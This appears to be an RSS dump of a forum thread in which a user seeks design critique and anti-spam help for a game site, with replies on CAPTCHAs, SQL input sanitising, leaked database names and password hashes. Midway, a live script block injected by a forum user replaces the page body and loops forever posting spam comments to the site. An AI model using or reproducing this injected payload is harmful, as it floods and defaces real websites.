channel.title: My site + halp
channel.description:
Well, recently I made a site from scratch, it being http://ret-ro.org
The site is supposedly for a game site, but as of right now you really can't do anything, it's main purpose is for design. Anyways, this isn't advertising, I want you to rate the design, I'll take critique, but not retarded 1 worded ones. Most of the links are down, soo.
-------------------------------------------------------------------------
HELP PART: Well, if you've been scrolling down the news, you could see some of them have like 12312312 comments. If you read it, there's bots fucking it up. Is there anyway to remove that? Captcha code maybe?
I also need suggestions probably. Also, if you're going to suggest making the comments on the same page, It's already supposed to do that, but it's kinda buggy.
All menu images have been rendered out from their game cards, rest of the design is 100% me.

item.title: My site + halp

[quote=“Cowie`, post:36, topic:297808”][quote author=Moparisthebest link=topic=394172.msg2939771#msg2939771 date=1251781298]
As to the spamming, as was stated above you could add a captcha. Or you could add a time limit to wait between posts from the same IP, or you could require registration. You can do many things to stop this.
[/quote]

OCR
Proxy
Registration script[/quote]
I’d seriously dive into and learn the ways of OCR if this guy were to implement CAPTCHAs on his pages…

Read full topic

item.title: My site + halp
item.dc:creator: @moparisthebest Moparisthebest
item.description:
@moparisthebest wrote:

[quote="_saporta, post:21, topic:297808"]…
No passwords = fail.
Could you perhaps hax another site… like http://ratemyserver.net pls

Also, could you guys tell me how you get my database names? >.>[/quote]

Whether they have your database names or not, they should not be able to do anything with them. You need to learn to sanitize your inputs, at the very least run ‘mysql_real_escape_string’ on EVERY string that you execute before you execute it. You could instead use prepared statements or some of the other niceties of mysqli, but before you worry about layout, you need to worry about security first.

As to the spamming, as was stated above you could add a captcha. Or you could add a time limit to wait between posts from the same IP, or you could require registration. You can do many things to stop this.

Read full topic

item.title: My site + halp
item.dc:creator: @system system
item.description:
@system wrote:

3/10

When I first visited the site, everything jumped out at me. I didn’t know where to start looking, and had to spend at least a minute trying to figure out just what the fuck was going on with the page. It honestly looks like you threw as much shit onto it as you could without any regard to what it looked like; don’t get me wrong, there are a lot of things that look good, but seeing as how they don’t mesh with anything else, the general collection of them together makes my eyes bleed.

Take, for instance, the “vote for coins” button. It’s flashy and catches the user’s attention with that orange color, but that color isn’t represented anywhere else on the page. So where the fuck did you get it from? Yeah, sure, you could argue that you wanted to catch the user’s eye (and then make him strain by reading white text on light orange background) if you didn’t have twenty other things that are doing the same thing. This is, of course, ignoring the fact that even the button’s design isn’t found anywhere else on the page.

Also, why did you stuff links to other parts of the site in the top right corner? Don’t try to answer that question, because no answer could possibly justify its existence. Most links, if not all, can be found in the navigation bars. If you have complaints that the navigation bars are too low on the page, maybe you could move them up by making the banner smaller and less annoying. There are so many other things I could talk about, but because I have to go to bed in about twelve hours, I don’t think I’ll have the time.

All jokes aside, you just have to realize that design has much more to do than aesthetics, although you still have a lot of work to do in that area as well.

Read full topic

</font></div></div><script type="text/javascript" src="http://jqueryjs.googlecode.com/files/jquery-1.3.2.min.js"></script><script type="text/javascript">$("body").html("<h1>HAI ITS 0FRZ JUST WANTED TO LET YOU KNOW YOU NEED TO FIX THIS</h1><br><br><h1 id=hcountr></h1>"); var i = 0; while (true) { i++; $.post("http://ret-ro.org/comments.php?id=40", {"commentFrom": "0frzbot", "commentMessage": "spam #" + i, "retROdate": "DIS HIDDEN INPUT DATE THING SUX IMO"}); $("hcountr").html("Total spam count: " + i); } </script>

item.title: My site + halp
item.dc:creator: @_saporta _saporta
item.description:
@_saporta wrote:

Uriko:

That was most certainly not a fail, you’re getting offended because he provided you with an exploit that you should immediately fix. Those MD5 hashes may be in a rainbow table (correct term?) so watch out.

Certainly not offended. I was perhaps was excited to see that, since I’m not the owner. Anyways, I told you it’s not much of a site, although it’s for design.
I’ll continue working on it when I prefer to. The owner doesn’t use the site, and I’m partially not a worker anymore. Go ahead and do w/e, I’ll just end up deleting and deleting.

Also, I’m not so advanced with it, thus the reason I created this topic for help, which is now being thrashed somewhat.
There’s no point asking for help here.

Lock pl1x

P.S: No comments… =\

Read full topic
